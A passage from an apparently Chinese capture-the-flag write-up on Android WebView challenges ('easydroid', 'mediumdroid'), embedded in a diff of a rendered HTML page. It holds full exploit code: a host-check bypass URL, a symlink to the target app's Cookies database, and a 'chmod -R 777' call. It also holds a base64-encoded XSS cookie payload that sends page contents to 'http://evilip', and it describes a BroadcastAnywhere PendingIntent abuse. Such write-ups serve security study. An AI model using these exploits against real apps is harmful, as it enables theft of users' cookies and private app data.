+                            <span class="kt">int</span> <span class="n">newEnd</span><span class="o">;</span>
+                            <span class="k">if</span> <span class="o">((</span><span class="n">end</span><span class="o">+</span><span class="n">1</span><span class="o">)</span> <span class="o">&lt;</span> <span class="n">data</span><span class="o">.</span><span class="na">length</span><span class="o">())</span> <span class="o">{</span>
+                                <span class="k">if</span> <span class="o">((</span><span class="n">newEnd</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">&#39;/&#39;</span><span class="o">,</span> <span class="n">end</span><span class="o">+</span><span class="n">1</span><span class="o">))</span> <span class="o">&gt;=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+                                    <span class="c1">// Found a scheme, remember it.
+</span><span class="c1"></span>                                    <span class="n">scheme</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">end</span><span class="o">+</span><span class="n">1</span><span class="o">,</span> <span class="n">newEnd</span><span class="o">);</span>
+                                    <span class="n">end</span> <span class="o">=</span> <span class="n">newEnd</span><span class="o">;</span>
+                                    <span class="k">if</span> <span class="o">(</span><span class="n">end</span> <span class="o">&lt;</span> <span class="n">data</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">newEnd</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">&#39;/&#39;</span><span class="o">,</span> <span class="n">end</span><span class="o">+</span><span class="n">1</span><span class="o">))</span> <span class="o">&gt;=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+                                        <span class="c1">// Found a authority, remember it.
+</span><span class="c1"></span>                                        <span class="n">authority</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">end</span><span class="o">+</span><span class="n">1</span><span class="o">,</span> <span class="n">newEnd</span><span class="o">);</span>
+                                        <span class="n">end</span> <span class="o">=</span> <span class="n">newEnd</span><span class="o">;</span>
+                                    <span class="o">}</span>
+                                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                                    <span class="c1">// All we have is a scheme.
+</span><span class="c1"></span>                                    <span class="n">scheme</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">end</span><span class="o">+</span><span class="n">1</span><span class="o">);</span>
+                                <span class="o">}</span>
+                            <span class="o">}</span>
+                            <span class="k">if</span> <span class="o">(</span><span class="n">scheme</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                                <span class="c1">// If there was no scheme, then this just targets the package.
+</span><span class="c1"></span>                                <span class="k">if</span> <span class="o">(!</span><span class="n">explicitAction</span><span class="o">)</span> <span class="o">{</span>
+                                    <span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="n">ACTION_MAIN</span><span class="o">);</span>
+                                <span class="o">}</span>
+                                <span class="n">data</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+                            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">authority</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                                <span class="n">data</span> <span class="o">=</span> <span class="n">scheme</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span><span class="o">;</span>
+                            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                                <span class="n">data</span> <span class="o">=</span> <span class="n">scheme</span> <span class="o">+</span> <span class="s">&#34;://&#34;</span> <span class="o">+</span> <span class="n">authority</span> <span class="o">+</span> <span class="n">data</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">end</span><span class="o">);</span>
+                            <span class="o">}</span>
+                        <span class="o">}</span>
+                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        <span class="n">data</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+
+                <span class="k">if</span> <span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="n">intent</span><span class="o">.</span><span class="na">mData</span> <span class="o">=</span> <span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalArgumentException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">throw</span> <span class="k">new</span> <span class="n">URISyntaxException</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+
+            <span class="k">return</span> <span class="n">intent</span><span class="o">;</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IndexOutOfBoundsException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">URISyntaxException</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="s">&#34;illegal Intent URI format&#34;</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>因为后续需要使用<code>file</code>协议加载本地文件，<code>MainActivty</code>中固定了协议只能是<code>http</code>，但是<code>TestActivity</code>文件也使用了webview且没有对url进行任何过滤操作，可以使用file协议。所以可以使用intent重定向，转到TestActivity。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestActivity</span> <span class="kd">extends</span> <span class="n">Activity</span> <span class="o">{</span>
+    <span class="cm">/* access modifiers changed from: protected */</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">&#34;url&#34;</span><span class="o">);</span>
+        <span class="n">WebView</span> <span class="n">webView</span> <span class="o">=</span> <span class="k">new</span> <span class="n">WebView</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">());</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="n">webView</span><span class="o">);</span>
+        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后携带url参数加载本地file文件。<code>intent</code>协议中携带参数的方式在源码中可以看到，携带String类型的参数时格式时<code>S.key=value;</code></p>
+<p>Apk通过广播的方式设置flag，flag写入本地Cookies文件:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">FlagReceiver</span> <span class="kd">extends</span> <span class="n">BroadcastReceiver</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">,</span> <span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">&#34;flag&#34;</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">flag</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">String</span> <span class="n">flag2</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">flag</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">&#34;UTF-8&#34;</span><span class="o">),</span> <span class="n">0</span><span class="o">);</span>
+                <span class="n">CookieManager</span> <span class="n">cookieManager</span> <span class="o">=</span> <span class="n">CookieManager</span><span class="o">.</span><span class="na">getInstance</span><span class="o">();</span>
+                <span class="n">cookieManager</span><span class="o">.</span><span class="na">setCookie</span><span class="o">(</span><span class="s">&#34;https://tiktok.com/&#34;</span><span class="o">,</span> <span class="s">&#34;flag=&#34;</span> <span class="o">+</span> <span class="n">flag2</span><span class="o">);</span>
+                <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">&#34;FlagReceiver&#34;</span><span class="o">,</span> <span class="s">&#34;received flag.&#34;</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">UnsupportedEncodingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="攻击过程-1">攻击过程</h3>
+<blockquote>
+<ol>
+<li>打开MainActivity，使用<code>http://toutiao.com@evil/loadCookie.html</code>绕过校验，写入cookie并停留40秒</li>
+<li>创建symlink.html符号连接，指向目标沙箱内Cookies数据库文件</li>
+<li>打开MainActivity，使用<code>http://toutiao.com@evil/loadFile.html</code>绕过校验，触发<code>shouldOverrideUrlLoading</code>方法加载TestActivity，url参数设置为<code>file:///data/user/0/com.bytectf.pwneasydroid/symlink.html</code></li>
+</ol>
+</blockquote>
+<p>步骤1中写入的cookie中包含恶意代码，代码作用是读取页面内容并发送到远程服务器。当步骤3中用file协议加载symlink.html文件时实际上时加载<code>/data/0/user/com.bytectf.easydroid./app_webview/Cookies</code>文件，渲染的过程中会执行注入到cookie中的恶意代码，导致cookie内容被发送到远程服务器。</p>
+<h3 id="exp-1">Exp</h3>
+<p>MainActivity:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">AppCompatActivity</span> <span class="o">{</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+        <span class="n">launch</span><span class="o">(</span><span class="s">&#34;http://toutiao.com@evilip/loadcookie.html&#34;</span><span class="o">);</span>
+        <span class="n">symlink</span><span class="o">();</span>
+        <span class="k">new</span> <span class="n">Handler</span><span class="o">().</span><span class="na">postDelayed</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span>
+            <span class="nd">@Override</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
+                <span class="n">launch</span><span class="o">(</span><span class="s">&#34;http://toutiao.com@evilip/loadfile.html&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">},</span> <span class="n">40000</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">launch</span><span class="o">(</span><span class="n">String</span> <span class="n">url</span><span class="o">){</span>
+        <span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+        <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&#34;com.bytectf.easydroid&#34;</span><span class="o">,</span> <span class="s">&#34;com.bytectf.easydroid.MainActivity&#34;</span><span class="o">);</span>
+        <span class="n">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+        <span class="n">intent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
+        <span class="n">intent</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span>
+                <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_PREFIX_URI_PERMISSION</span>
+                <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span>
+                <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_WRITE_URI_PERMISSION</span><span class="o">);</span>
+        <span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="n">String</span> <span class="nf">symlink</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">root</span> <span class="o">=</span> <span class="n">getApplicationInfo</span><span class="o">().</span><span class="na">dataDir</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">symlink</span> <span class="o">=</span> <span class="n">root</span> <span class="o">+</span> <span class="s">&#34;/symlink.html&#34;</span><span class="o">;</span>
+        <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">&#34;url&#34;</span><span class="o">,</span> <span class="n">symlink</span><span class="o">);</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">String</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getApplicationInfo</span><span class="o">(</span><span class="s">&#34;com.bytectf.easydroid&#34;</span><span class="o">,</span>
+                    <span class="n">0</span><span class="o">).</span><span class="na">dataDir</span> <span class="o">+</span> <span class="s">&#34;/app_webview/Cookies&#34;</span><span class="o">;</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;rm &#34;</span> <span class="o">+</span> <span class="n">symlink</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;ln -s &#34;</span> <span class="o">+</span> <span class="n">cookies</span> <span class="o">+</span> <span class="s">&#34; &#34;</span> <span class="o">+</span> <span class="n">symlink</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod -R 777 &#34;</span> <span class="o">+</span> <span class="n">root</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span>
+
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">PackageManager</span><span class="o">.</span><span class="na">NameNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">symlink</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>loadcookie.html:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> injected cookie with xss<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="nb">document</span><span class="p">.</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="s2">&#34;x = &#39;&lt;img src=\&#34;x\&#34; onerror=\&#34;eval(atob(&#39;bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly9ldmlsaXAvP2Nvb2tpZT0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs=&#39;))\&#34;&gt;&#39;&#34;</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="c">&lt;!--new Image().src = &#34;http://evilip/?cookie=&#34; + encodeURIComponent(document.getElementsByTagName(&#34;html&#34;)[0].innerHTML);--&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>loadfile.html:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>load file<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;intent:#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=file:///data/user/0/com.bytectf.pwneasydroid/symlink.html;end&#34;</span><span class="p">;</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在自己写intent隐式跳转的时候，intent的具体格式搜了挺久才找到正确的写法，然后其实有直接转String的方法:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Intent</span> <span class="n">i2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+<span class="n">i2</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&#34;com.bytectf.easydroid&#34;</span><span class="o">,</span> <span class="s">&#34;com.bytectf.easydroid.TestActivity&#34;</span><span class="o">);</span>
+<span class="n">i2</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;url&#34;</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
+<span class="n">String</span> <span class="n">uri_data</span> <span class="o">=</span> <span class="n">i2</span><span class="o">.</span><span class="na">toUri</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">URI_INTENT_SCHEME</span><span class="o">);</span>  <span class="c1">// 在这里直接转String
+</span><span class="c1"></span><span class="n">intent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">&#34;http://ip/jump.html?url=&#34;</span> <span class="o">+</span> <span class="n">Uri</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">uri_data</span><span class="o">)));</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="mediumdroid">mediumdroid</h2>
+<h3 id="apk分析-2">Apk分析</h3>
+<p>与easydroid类似，但是flag没有存储在Cookie中，而是跟babydroid一样存储在flag文件中。</p>
+<p>在TestActivity中提供了一个jsi</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestActivity</span> <span class="kd">extends</span> <span class="n">Activity</span> <span class="o">{</span>
+    <span class="cm">/* access modifiers changed from: protected */</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">&#34;url&#34;</span><span class="o">);</span>
+        <span class="n">WebView</span> <span class="n">webView</span> <span class="o">=</span> <span class="k">new</span> <span class="n">WebView</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">());</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="n">webView</span><span class="o">);</span>
+        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">webView</span><span class="o">.</span><span class="na">addJavascriptInterface</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">&#34;jsi&#34;</span><span class="o">);</span>
+        <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@JavascriptInterface</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">Te3t</span><span class="o">(</span><span class="n">String</span> <span class="n">title</span><span class="o">,</span> <span class="n">String</span> <span class="n">content</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">Build</span><span class="o">.</span><span class="na">VERSION</span><span class="o">.</span><span class="na">SDK_INT</span> <span class="o">&gt;=</span> <span class="n">26</span><span class="o">)</span> <span class="o">{</span>
+            <span class="o">((</span><span class="n">NotificationManager</span><span class="o">)</span> <span class="n">getSystemService</span><span class="o">(</span><span class="n">NotificationManager</span><span class="o">.</span><span class="na">class</span><span class="o">)).</span><span class="na">createNotificationChannel</span><span class="o">(</span><span class="k">new</span> <span class="n">NotificationChannel</span><span class="o">(</span><span class="s">&#34;CHANNEL_ID&#34;</span><span class="o">,</span> <span class="s">&#34;CHANNEL_NAME&#34;</span><span class="o">,</span> <span class="n">4</span><span class="o">));</span>
+        <span class="o">}</span>
+        <span class="n">NotificationManagerCompat</span><span class="o">.</span><span class="na">from</span><span class="o">(</span><span class="k">this</span><span class="o">).</span><span class="na">notify</span><span class="o">(</span><span class="n">100</span><span class="o">,</span> <span class="k">new</span> <span class="n">NotificationCompat</span><span class="o">.</span><span class="na">Builder</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">&#34;CHANNEL_ID&#34;</span><span class="o">).</span><span class="na">setContentTitle</span><span class="o">(</span><span class="n">title</span><span class="o">).</span><span class="na">setContentText</span><span class="o">(</span><span class="n">content</span><span class="o">).</span><span class="na">setSmallIcon</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">mipmap</span><span class="o">.</span><span class="na">ic_launcher</span><span class="o">).</span><span class="na">setContentIntent</span><span class="o">(</span><span class="n">PendingIntent</span><span class="o">.</span><span class="na">getBroadcast</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(),</span> <span class="n">0</span><span class="o">)).</span><span class="na">setAutoCancel</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">setPriority</span><span class="o">(</span><span class="n">1</span><span class="o">).</span><span class="na">build</span><span class="o">());</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其中<code>PendingIntent.getBroadcast(this, 0, new Intent()</code>存在<code>BroadcastAnywhere</code>漏洞。借助这个漏洞可以写一个<code>NotificationListenerService</code>(监听通知栏的消息)进行监听，然后由于直接使用<code>new Intent()</code>，action，category，data，clipdata，package均为空可以被修改。将<code>action</code>和<code>package</code>修改成<code>FlagReceiver</code>接受的广播就可以在<code>flag</code>文件中写入xss payload，后面再用<code>file</code>协议加载<code>flag</code>文件即可。</p>
+<h3 id="攻击过程-2">攻击过程</h3>
+<blockquote>
+<ol>
+<li>调用MainActivity，跳转到TestActivity，url指向的网页内容写调用jsi.Te3t的代码。</li>
+<li>用来监听的<code>NotificationListenerService</code>会监听到对应的广播PendingIntent，将action设置成<code>SET_FLAG</code>，内容设置成xss payload然后转发出去。</li>
+<li>调用MainActivity，跳转到TestActivity，url指向的<code>symlink.html</code>(flag文件的链接)</li>
+</ol>
+</blockquote>
+<h3 id="exp-2">Exp</h3>
+<p>MainActivity:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
